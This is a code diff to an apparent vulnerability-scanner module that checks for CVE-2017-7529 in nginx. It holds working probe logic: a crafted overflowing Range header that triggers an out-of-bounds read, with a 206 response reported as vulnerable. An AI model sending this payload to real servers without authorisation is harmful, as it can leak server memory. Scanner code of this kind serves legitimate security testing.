@@ -5,10 +5,7 @@ name: CVE-2017-7529漏洞
 description: CVE-2017-7529越界读取信息漏洞
 '''
 
-import requests
-from urllib import request, parse
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
 
 class CVE_2017_7529_BaseVerify:
     def __init__(self, url):
@@ -21,11 +18,11 @@ class CVE_2017_7529_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            check_req = requests.get(self.url, headers = self.headers, allow_redirects = False, verify = False)
+            check_req = request.get(self.url, headers = self.headers)
             start = len(check_req.content) + 605
             end = 0x8000000000000000 - start
             self.headers["Range"] = "bytes=-{},-{}".format(start, end)
-            cmd_req = requests.get(self.url, headers = self.headers, timeout = 10, allow_redirects = False, verify = False )
+            cmd_req = request.get(self.url, headers = self.headers )
             if cmd_req.status_code == 206:
                 #print(cmd_req.text)
                 print("存在CVE-2017-752漏洞")
